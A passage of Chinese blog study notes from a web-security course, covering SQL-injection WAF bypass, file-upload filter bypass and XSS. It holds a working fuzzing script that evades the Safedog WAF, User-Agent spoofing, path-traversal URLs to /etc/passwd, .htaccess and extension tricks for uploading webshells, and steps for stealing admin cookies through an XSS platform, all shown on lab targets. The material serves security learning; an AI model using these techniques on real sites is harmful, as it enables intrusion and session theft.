class="string">&quot;/*!44575select*/&quot;</span>)</span><br><span class="line">        payload=payload.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;%20&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload=payload.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload=payload.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;database()&quot;</span>,<span class="string">&quot;database%23a%0a()&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">import requests,time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1&#x27;</span></span><br><span class="line">union=<span class="string">&#x27;union&#x27;</span></span><br><span class="line">select=<span class="string">&#x27;select&#x27;</span></span><br><span class="line">num=<span class="string">&#x27;1,2,3&#x27;</span></span><br><span class="line">a=&#123;<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%23&#x27;</span>&#125;</span><br><span class="line">aa=&#123;<span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">aaa=&#123;<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%23&#x27;</span>&#125;</span><br><span class="line">b=<span class="string">&#x27;/*!&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;*/&#x27;</span></span><br><span class="line">def <span class="title function_ invoke__">bypass</span>():</span><br><span class="line">	<span class="keyword">for</span> xiaodi in a:</span><br><span class="line">		<span class="keyword">for</span> xiaodis in aa:</span><br><span class="line">			<span class="keyword">for</span> xiaodiss in aaa:</span><br><span class="line">				<span class="keyword">for</span> two in <span class="title function_ invoke__">range</span>(<span class="number">44500</span>,<span class="number">44600</span>):</span><br><span class="line">					urls=url+xiaodi+xiaodis+xiaodiss+b+<span class="title function_ invoke__">str</span>(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiao</span><br><span class="line">diss+num</span><br><span class="line">					<span class="comment">#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xia</span></span><br><span class="line">odiss+num</span><br><span class="line">					<span class="keyword">try</span>:</span><br><span class="line">						result=requests.<span class="title function_ invoke__">get</span>(urls).text</span><br><span class="line">						len_r=<span class="title function_ invoke__">len</span>(result)</span><br><span class="line">						<span class="keyword">if</span> (result.<span class="title function_ invoke__">find</span>(<span class="string">&#x27;safedog&#x27;</span>)==-<span class="number">1</span>):</span><br><span class="line">							<span class="comment">#print(&#x27;bypass url addreess：&#x27;+urls+&#x27;|&#x27;+str(len_r))</span></span><br><span class="line">							 <span class="keyword">print</span>(<span class="string">&#x27;bypass url addreess：&#x27;</span>+urls+<span class="string">&#x27;|&#x27;</span>+<span class="title function_ invoke__">str</span>(len_r))</span><br><span class="line">						<span class="keyword">if</span> len_r==<span class="number">715</span>:</span><br><span class="line">                             fp = <span class="title function_ invoke__">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                             fp.<span class="title function_ invoke__">write</span>(urls+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                             fp.<span class="title function_ invoke__">close</span>()</span><br><span class="line">					except <span class="built_in">Exception</span> <span class="keyword">as</span> err:</span><br><span class="line">						<span class="keyword">print</span>(<span class="string">&#x27;connecting error&#x27;</span>)</span><br><span class="line">						time.<span class="title function_ invoke__">sleep</span>(<span class="number">0.1</span>)</span><br><span class="line">if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">&#x27;fuzz strat!&#x27;</span>)</span><br><span class="line">	<span class="title function_ invoke__">bypass</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.伪造成百度爬虫脚本user-Agent</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://192.168.0.103:8080/&#x27;</span><br><span class="line"></span><br><span class="line">head=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;</span><br><span class="line">&#125;</span><br><span class="line">for data in open(&#x27;PH1P.txt&#x27;):</span><br><span class="line">    data=data.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">    urls=url+data</span><br><span class="line">    code=requests.get(urls).status_code</span><br><span class="line">    print(urls+&#x27;|&#x27;+str(code))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="演示案例-4"><a href="#演示案例-4" class="headerlink" title="演示案例"></a>演示案例</h3><pre><code>1.简要其他绕过方式学习
</code></pre>
<p>1、白名单<br>方式一：IP 白名单 （一般客户端的IP地址）<br>        从网络层获取的 ip，这种一般伪造不来，(抓包会影响数据包的内容，而不会真正改变网络流量的源IP地址。)</p>
<p>如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情况。<br>测试方法：修改 http 的 header 来 bypass waf<br>X-forwarded-for（ 通常由代理服务器添加，用于表示客户端的原始IP地址。由于请求可能经过多个代理服务器，每个代理都会在此字段中添加自己的IP地址，从而形成一个IP地址列表。最左边的IP地址是最初的客户端IP。）<br>X-remote-IP		 （也是用于表示客户端的原始IP地址。）<br>X-originating-IP   （电子邮件的头部，用于标识邮件的发送者的IP地址。）<br>x-remote-addr	（类似于X-Forwarded-For）<br>X-Real-ip			  （类似于X-Forwarded-For）</p>
<p>方式二：静态资源<br>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测<br>效率，不去检测这样一些静态文件名后缀的请求。<br><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a><br><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a><br>例如：Aspx&#x2F;php 只识别到前面的.aspx&#x2F;.php 后面基本不识别</p>
<p>方式三：url 白名单<br>为了防止误拦，部分 waf 内置默认的白名单列表，如 admin&#x2F;manager&#x2F;system 等管理后台。&#x3D;&#x3D;只要 url<br>中存在白名单的字符串&#x3D;&#x3D;，就作为白名单不进行检测。<br>常见的 url 构造姿势：<br><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/admin.php?id=1">http://10.9.9.201/sql.php/admin.php?id=1</a><br><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php?a=/manage/&b=%E2%80%A6/etc/passwd">http://10.9.9.201/sql.php?a=/manage/&amp;b=…/etc/passwd</a><br><a target="_blank" rel="noopener" href="http://10.9.9.201/%E2%80%A6/%E2%80%A6/%E2%80%A6/manage/%E2%80%A6/sql.asp?id=2">http://10.9.9.201/…/…/…/manage/…/sql.asp?id=2</a><br>waf通过&#x2F;manage&#x2F;“进行比较，只需url中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们就可以通过&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;…&#x2F;etc&#x2F;passwd绕过防御规则。</p>
<p>方式四：爬虫白名单<br>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：<br>1、根据UserAgent 2、通过行为判断<br>UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。<br>User Agent Switcher（Firefox附加组件），</p>
<pre><code>2.FUZZ 绕过脚本结合编写测试
</code></pre>
<p>FUZZ脚本编写</p>
<pre><code>3.阿里云盾防 SQL 注入简要分析

4.安全狗+云盾SQL注入插件脚本编写
</code></pre>
<p>自己写脚本，直接使用脚本是跑不了的，放到本地抓包跑一下；</p>
<p>代码：<img src="https://img-blog.csdnimg.cn/a7f0c5beb24b46ba812904a9483b13bf.png" alt="在这里插入图片描述"><br>slpmap命令<img src="https://img-blog.csdnimg.cn/018d6682d36243eea90ce6312dd66730.png" alt="在这里插入图片描述"></p>
<p>失败原因： &#x3D;&#x3D;user-agent 识别到了sqlmap ，并且sqlmap注入太快了&#x3D;&#x3D;<img src="https://img-blog.csdnimg.cn/7bb13d8af060456bacb8dc0dd5373e00.png" alt="在这里插入图片描述"></p>
<p>解决方法：<br>         1.添加延时参数 –delay参数</p>
<p>2.使用代理池随机出IP</p>
<p>3.更改请求头，添加http白名单 浏览器请求头 –user-Agent&#x3D;” “</p>
<p><img src="https://img-blog.csdnimg.cn/080b3c742e3d43aaa4d81c2e527b7507.png" alt="在这里插入图片描述"></p>
<p>4.自己编写数据包（这是一个一个尝试的办法）</p>
<p><img src="https://img-blog.csdnimg.cn/d7057a8931444c3a9e1fc1952cc4fb67.png" alt="在这里插入图片描述"></p>
<p>然后使用TXT文本里的数据包注入</p>
<p><img src="https://img-blog.csdnimg.cn/8b46fda73a544332b90839984a1daf92.png" alt="在这里插入图片描述"></p>
<h2 id="第20天：WEB-漏洞-文件上传之基础及过滤方式"><a href="#第20天：WEB-漏洞-文件上传之基础及过滤方式" class="headerlink" title="第20天：WEB 漏洞-文件上传之基础及过滤方式"></a>第20天：WEB 漏洞-文件上传之基础及过滤方式</h2><p><img src="https://img-blog.csdnimg.cn/7c6b3c40ed534aa3b6c4ce4a23a9d042.png" alt="在这里插入图片描述"><br>什么是文件上传漏洞</p>
<p>指用户上传了一个&#x3D;&#x3D;可执行的脚本文件&#x3D;&#x3D;，并通过此脚本文件获得了执行服务器端命令的能力。<br>文件上传漏洞的时候看对方的代码是否写的比较完整、安全，疏忽了验证就会造成文件上传漏洞；</p>
<p>文件上传漏洞有哪些危害</p>
<p>造成文件上传漏洞的主要原因是应用程序中有上传功能，但上传的文件没有通过严格的合法性检查或者检查功能有缺陷，导致木马文件上传到服务器。文件上传漏洞危害极大，因为恶意代码可以直接上传到服务器，可能造成服务器网页修改、网站暂停、服务器远程控制、后门安装等严重后果。<br>文件上传漏洞如何查找及判断</p>
<p>1.黑盒查找<br>扫描敏感文件，获取上传地址；<br>首先找到文件上传的窗口，然后&#x3D;&#x3D;判断是服务器端还是客户端的验证&#x3D;&#x3D;，客户端较容易判断出来，最后检验是哪种服务器端的过滤方式。判断是客户端和服务端检验，再检验是白名单还是黑名单，根据具体情况来决定采用什么绕过方式。</p>
<p>2.白盒查找<br>从对方的源代码里来分析漏洞；</p>
<p>文件上传漏洞有哪些需要注意的地方<br>拿到一个文件上传，对文件上传的类型做一个区分；确定文件上传的类型，采取这样的类型来去做测试；<br>演示案例</p>
<pre><code>    常规文件上传地址的获取说明
</code></pre>
<p>使用谷歌语法搜索.php</p>
<pre><code>2.不同格式下的文件类型后门测试
</code></pre>
<p>不要妄想通过一个图片你能带着你的后门来控制网站。直接改格式有时候并没有什么用，&#x3D;&#x3D;什么格式代码就用什么格式去执行。&#x3D;&#x3D;</p>
<p>在这里插入图片描述</p>
<pre><code>3.配合解析漏洞下的文件类型后门测试
</code></pre>
<p>解析漏洞是指web服务器因对http请求处理不当导致将非可执行的脚本，文件等当做可执行的脚本，文件等执行。该漏洞—般配合服务器的文件上传功能使用，以获取服务器的权限。<br>解析漏洞一般发生在iis、nginx、apache</p>
<p>首先启用vulhub靶场，搭建文件上传解析漏洞的靶场；</p>
<p>启动靶场环境</p>
<p>访问靶场</p>
<p>提交的图片中插入语句<?php phpinfo();?>，然后实现解析漏洞；</p>
<p><img src="https://img-blog.csdnimg.cn/4d5c2699ddbc40f991e1b97d154eb7be.png" alt="img"></p>
<p>这并不是说这样加了都可以，是因为这里有Ngiinx畸形解析漏洞， 对方在解析上的出现了混乱；<br>解析的规则是要看有没有漏洞，有的话可以按这种方法，没有的话就无法实现</p>
<pre><code>5.某 CMS 及 CVE 编号文件上传漏洞测试
</code></pre>
<p>可以去网上&#x3D;&#x3D;查询FineCMS&#x3D;&#x3D;的漏洞，比自己一个人乱搞可以提高很多效率；</p>
<p>在这里插入图片描述</p>
<p>weblogic任意文件上传漏洞<br>启动靶场环境</p>
<p>在这里插入图片描述</p>
<p>跟着靶场的复现一步步完成就可以</p>
<p>在这里插入图片描述<br>在这里插入图片描述</p>
<p>最后要上传一个jsp文件，我没有这样的后门文件，所以最后没办法上传成功，但是前面的步骤都是正确的；</p>
<p>在这里插入图片描述</p>
<h2 id="第21天：WEB-漏洞-文件上传之后端黑白名单绕过"><a href="#第21天：WEB-漏洞-文件上传之后端黑白名单绕过" class="headerlink" title="第21天：WEB 漏洞-文件上传之后端黑白名单绕过"></a>第21天：WEB 漏洞-文件上传之后端黑白名单绕过</h2><p><img src="https://img-blog.csdnimg.cn/423caf88c14f4b11974093d7c9ba1973.png" alt="在这里插入图片描述"></p>
<p>文件上传&#x3D;&#x3D;常见验证&#x3D;&#x3D;：</p>
<p>1.&#x3D;&#x3D;后缀名&#x3D;&#x3D;，类型，文件头等</p>
<p>后缀名：<br>黑名单：不允许上传的格式后缀<br>asp php jsp aspx cgi war 等<br>php5、phtml等后缀没有定义到黑名单里面，也许可以使用绕过文件上传</p>
<p>白名单：可以上传的格式后缀<br>jpg png zip rar gif 等</p>
<p>2.文件类型：&#x3D;&#x3D;MIME 信息&#x3D;&#x3D; bp里面content-type</p>
<p>3.文件头：&#x3D;&#x3D;内容头信息&#x3D;&#x3D;</p>
<img src="https://img-blog.csdnimg.cn/2f7497e9992f46c8a6f5e3cb3adf79d0.png" alt="在这里插入图片描述" style="zoom:67%;" />


<p>演示案例</p>
<p>黑名单绕过：</p>
<pre><code>1.uploadlabs Pass-02
</code></pre>
<p>打开靶场，查看源代码</p>
<p>在这里插入图片描述</p>
<p>只判断文件类型，抓包修改文件类型为image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif</p>
<p>在这里插入图片描述</p>
<p>修改文件类型后</p>
<p>在这里插入图片描述</p>
<pre><code>2.uploadlabs Pass-03
</code></pre>
<p>打开靶场，查看源代码</p>
<p>在这里插入图片描述</p>
<p>黑名单里面不允许上传.asp、.aspx、.php、.jsp<br>但是我们可以上传.php5、.phtml等；</p>
<p>在这里插入图片描述</p>
<p>修改后缀名，上传成功</p>
<p>在这里插入图片描述</p>
<pre><code>3.uploadlabs Pass-04
</code></pre>
<p>打开靶场，查看源代码</p>
<p>在这里插入图片描述</p>
<p>所有的后缀名基本上都不能使用了，除了.htaccess<br>先上传一个.htaccess后缀名的文件<br>内容如下：</p>
<p>&lt;FilesMatch “shana”&gt;<br>Sethandler application&#x2F;x-httpd-php<br></FilesMatch ></p>
<pre><code>1
2
3
</code></pre>
<p>在这里插入图片描述</p>
<p>然后再上传一个.jpg后缀名的文件</p>
<p>在这里插入图片描述</p>
<p>上传成功</p>
<pre><code>4.uploadlabs Pass-05
</code></pre>
<p>打开靶场，查看源代码<br>可以看出有大小写的区分，可以使用大小写绕过</p>
<p>在这里插入图片描述</p>
<p>更改大小写，上传成功</p>
<p>在这里插入图片描述</p>
<pre><code>5.uploadlabs Pass-06
</code></pre>
<p>打开靶场，查看源代码，没有对后缀名进行去空，因此可以在后缀名加空格绕过</p>
<p>在这里插入图片描述</p>
<p>修改文件名后缀名大小写，增加空格</p>
<p>在这里插入图片描述</p>
<p>文件上传成功</p>
<h2 id="第25天：WEB-漏洞-XSS跨站之原理分类及攻击手法"><a href="#第25天：WEB-漏洞-XSS跨站之原理分类及攻击手法" class="headerlink" title="第25天：WEB 漏洞-XSS跨站之原理分类及攻击手法"></a>第25天：WEB 漏洞-XSS跨站之原理分类及攻击手法</h2><p>XSS跨站漏洞产生原理，危害，特点<br>原理：XSS简称跨站脚本，是由于WEB应用程序对用户的输入过滤不足而产生的<br>攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，<br>对受害用户可能&#x3D;&#x3D;采取Cookies资料窃取，会话劫持，钓鱼欺骗&#x3D;&#x3D;等各种攻击</p>
<p>XSS跨站大部分都是前端的漏洞，和网站脚本没有关系。</p>
<p>XSS简介<br>  跨站脚本攻击是指Web页面里&#x3D;&#x3D;插入恶意Script代码&#x3D;&#x3D;，<br>  攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。<br>  xss漏洞通常是&#x3D;&#x3D;通过php的输出函数将javascript代码输出到html页面中&#x3D;&#x3D;，通过用户本地浏览器执行的，所以&#x3D;&#x3D;xss漏洞关键就是寻找参数未过滤的输出函数&#x3D;&#x3D;。</p>
<p>产生层面<br>属于前端漏洞，产生在浏览器界面，JavaScript代码能干什么，执行之后就会达到相应的效果</p>
<p>函数类<br>一般哪些函数会和这些漏洞有关系，常见的输出型函数会产生关系，比如：print、print_r、echo、printf、sprintf、die、var_dump、var_export</p>
<p>危害影响<br>会受到JavaScript语句的影响，</p>
<p>浏览器内核版本<br>浏览器内核版本也会决定漏洞的情况，利用这个漏洞需要浏览器版本和内核没有过滤XSS攻击<br>例如：<br>        像火狐就可以成功的执行这个JS代码<br>        但是IE浏览器就会有过滤，阻止JS代码的执行</p>
<p>漏洞攻击成功的&#x3D;&#x3D;前提条件&#x3D;&#x3D;：<br>浏览器内核版本会决定漏洞是否执行，浏览器版本高的话，会有一些安全策略，阻止一些JS脚本的执行。即使有漏洞也无法利用成功</p>
<p>XSS跨站漏洞分类<br>1.反射型（只有一次效果）</p>
<p>原理:将恶意js代码作为输入提交到服务器端，服务器端解析后响应，&#x3D;&#x3D;js代码随响应内容一起传回给浏览器，最后浏览器解析执行js代码&#x3D;&#x3D;。只有一次效果，通常伪造成链接获取cookie或着进行钓鱼欺骗。<br>       通常出现在搜索框和用户登录口。</p>
<p>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
<p>2.存储型（持久化）</p>
<p>攻击者传入的js代码在服务器端（数据库，内存，文件系统等）存储下来，用户每次访问都会执行恶意构造的js代码。持久性的。<br>     通常出现在留言板等与数据库交互的地方。</p>
<p>3.DOM型</p>
<p>DOM，可以认为是反射性xss，但是差别在于DOM XSS的代码并不需要服务器参与，发生在客户端，DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等，触发XSS靠的是浏览器端的DOM解<br>析。<br>        通常出现在页面跳转的地方，常用方法location.replace，document.write()等调用DOM对象的地方。</p>
<p>区别</p>
<p><img src="https://img-blog.csdnimg.cn/72654a001e2142afa08d549459573a47.png" alt="在这里插入图片描述"></p>
<p>#’ οnclick&#x3D;“alert(2)”&gt;</p>
<p>演示案例<br>1.XSS 漏洞代码绕过靶场使用</p>
<p>在Pikachu的靶场先试一下反射型的。</p>
<p>再试一下存储型</p>
<p>一样还是成功的</p>
<p>2.XSS 平台及工具简要演示测试</p>
<p>百度XSS平台</p>
<p>1、 注册</p>
<p>2.、新创建一个我的项目</p>
<p>3.、选择自己需要的功能，打钩</p>
<p>4、查看代码</p>
<p>5、把这些跨站代码弄到目标攻击的网站</p>
<p>6.、等管理员查看后台留言板的时候</p>
<p>7.、发现请求了这个地址。在平台上就有信息了</p>
<p>cookie session<br>用户凭据：通过凭据可以判断对方身份信息<br>cookie 存储本地 存活时间较长 小中型<br>session 会话 存储服务器 存活时间较短 大型</p>
<h2 id="第26天：WEB-漏洞-XSS跨站之订单及shell箱子反杀记"><a href="#第26天：WEB-漏洞-XSS跨站之订单及shell箱子反杀记" class="headerlink" title="第26天：WEB 漏洞-XSS跨站之订单及shell箱子反杀记"></a>第26天：WEB 漏洞-XSS跨站之订单及shell箱子反杀记</h2><p>XSS平台及工具使用<br>还可以在kali里面安装beef，类似于XSS平台。<br>通过XSS平台获取cookie</p>
<p>Webshell后门中的后门<br>网络上还是有很多大马，后门。都是通过别人下载之后，通过他人之手盗取别人的信息</p>
<p>跨站攻击主要攻击的地方</p>
<p>演示案例<br>1.某营销订单系统 XSS 盲打_平台</p>
<p>管理员订单查询的时候</p>
<p>成功的触发了跨站代码</p>
<p>2.某 Shell 箱子系统 XSS 盲打_工具</p>
<p>将盗取的信息统一的放到这个箱子里进行管理，当别人使用你分享的后门工具时，你后门工具里面的代码，会把你获取的权限，发送到这个箱子里面。所以谨慎使用他人工具</p>
<p>3.工具 Http&#x2F;s 数据包提交 Postman 使用</p>
<p>上面的是通过XSS平台获取的cookie，下面是浏览器原本的cookie，明显的不一样。</p>
<p>用postman这个工具，把得到的cookie加上这个PHPSESSID，就可以访问后台了</p>
<p>如果对方网站采取session验证的话，盗取cookie是无效的。session没有储存到对方的电脑上，储存到服务器上。只能盗取本地的，session在服务端，所以我们没有接收到PHPSESSID这个数据。</p>
<p>但是在phpinfo()页面，我们是可以看到的我们需要的PHPSESSID</p>
<p>所以我们可以在XSS平台上，借助一种功能，获取页面源码，访问phpinfo()，得到session的ID</p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-09-06 10:43:09" itemprop="dateModified" datetime="2023-09-06T10:43:09+08:00">2023-09-06</time>
  </span>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>Kobe_ <i class="ic i-at"><em>@</em></i>简单の博客
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2023/06/01/%E5%B0%8F%E8%BF%AA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="小迪网络安全">http://example.com/2023/06/01/小迪网络安全/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2023/05/09/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;image.baidu.com&#x2F;search&#x2F;down?url&#x3D;https:&#x2F;&#x2F;lz.sinaimg.cn&#x2F;large&#x2F;6833939bly1gipeybxm1pj20zk0m8niv.jpg" title="靶场练习">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>靶场练习</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/06/04/PHP/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;image.baidu.com&#x2F;search&#x2F;down?url&#x3D;https:&#x2F;&#x2F;lz.sinaimg.cn&#x2F;large&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="php">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>php</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%A9"><span class="toc-number">1.</span> <span class="toc-text">第一天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-number">1.1.</span> <span class="toc-text">域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">1.2.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"><span class="toc-number">1.3.</span> <span class="toc-text">脚本语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">1.4.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.5.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.</span> <span class="toc-text">漏洞类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B"><span class="toc-number">1.7.</span> <span class="toc-text">演示案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E8%B5%84%E6%BA%90"><span class="toc-number">1.8.</span> <span class="toc-text">资源资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%A9%E2%80%93%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">2.</span> <span class="toc-text">第二天–数据包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-https-amp-http"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 https&amp;http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Request-%E8%AF%B7%E6%B1%82%E6%95%B0%E6%8D%AE%E5%8C%85%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 Request 请求数据包数据格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Request-Headers"><span class="toc-number">2.3.</span> <span class="toc-text">Request Headers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E8%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">请求行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">2.5.</span> <span class="toc-text">请求头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E4%BD%93"><span class="toc-number">2.6.</span> <span class="toc-text">请求体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Response-%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E5%8C%85%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.7.</span> <span class="toc-text">2.3 Response 返回数据包数据格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-%E6%80%9D%E8%80%83%E9%A2%98-x3D-x3D"><span class="toc-number">2.8.</span> <span class="toc-text">&#x3D;&#x3D;思考题&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-%E8%B5%84%E6%BA%90%E8%B5%84%E6%BA%90-x3D-x3D"><span class="toc-number">2.9.</span> <span class="toc-text">&#x3D;&#x3D;资源资源&#x3D;&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%A4%A9%E2%80%93-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95"><span class="toc-number">3.</span> <span class="toc-text">第三天– 搭建安全拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 网站搭建环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%9F%BA%E4%BA%8E%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E7%AE%80%E8%A6%81%E8%AF%86%E5%88%AB"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 基于中间件的简要识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E5%90%8E%E9%97%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 后门注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E8%B5%84%E6%BA%90-1"><span class="toc-number">3.5.</span> <span class="toc-text">资源资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%A4%A9%E2%80%93WEB-%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95"><span class="toc-number">4.</span> <span class="toc-text">第四天–WEB 源码拓展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-x3D-x3D-%E4%BF%A1%E6%81%AF%E6%95%8F%E6%84%9F%E7%82%B9-x3D-x3D"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 